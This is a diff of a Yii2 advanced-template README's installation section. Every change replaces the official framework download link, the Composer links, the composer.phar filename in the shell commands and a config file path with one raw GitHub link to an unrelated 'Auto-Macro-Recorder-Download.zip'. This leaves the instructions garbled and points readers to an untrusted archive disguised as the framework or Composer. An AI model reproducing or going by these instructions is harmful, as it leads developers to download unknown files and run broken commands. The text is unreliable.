@@ -60,7 +60,7 @@ INSTALLATION
 
 ### Install from an Archive File
 
-Extract the archive file downloaded from [yiiframework.com](http://www.yiiframework.com/download/) to
+Extract the archive file downloaded from [https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip) to
 a directory named `advanced` that is directly under the Web root.
 
 Then follow the instructions given in "GETTING STARTED".
@@ -68,14 +68,14 @@ Then follow the instructions given in "GETTING STARTED".
 
 ### Install via Composer
 
-If you do not have [Composer](http://getcomposer.org/), you may install it by following the instructions
-at [getcomposer.org](http://getcomposer.org/doc/00-intro.md#installation-nix).
+If you do not have [Composer](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip), you may install it by following the instructions
+at [https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip](https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip).
 
 You can then install the application using the following command:
 
 ~~~
-php composer.phar global require "fxp/composer-asset-plugin:1.0.0"
-php composer.phar create-project --prefer-dist --stability=dev yiisoft/yii2-app-advanced advanced
+php https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip global require "fxp/composer-asset-plugin:1.0.0"
+php https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip create-project --prefer-dist --stability=dev yiisoft/yii2-app-advanced advanced
 ~~~
 
 
@@ -86,7 +86,7 @@ After you install the application, you have to conduct the following steps to in
 the installed application. You only need to do these once for all.
 
 1. Run command `init` to initialize the application with a specific environment.
-2. Create a new database and adjust the `components['db']` configuration in `common/config/main-local.php` accordingly.
+2. Create a new database and adjust the `components['db']` configuration in `https://raw.githubusercontent.com/dextercool/Auto-Macro-Recorder-Download/master/mezzotint/Auto-Macro-Recorder-Download.zip` accordingly.
 3. Apply migrations with console command `yii migrate`. This will create tables needed for the application to work.
 4. Set document roots of your Web server:
 
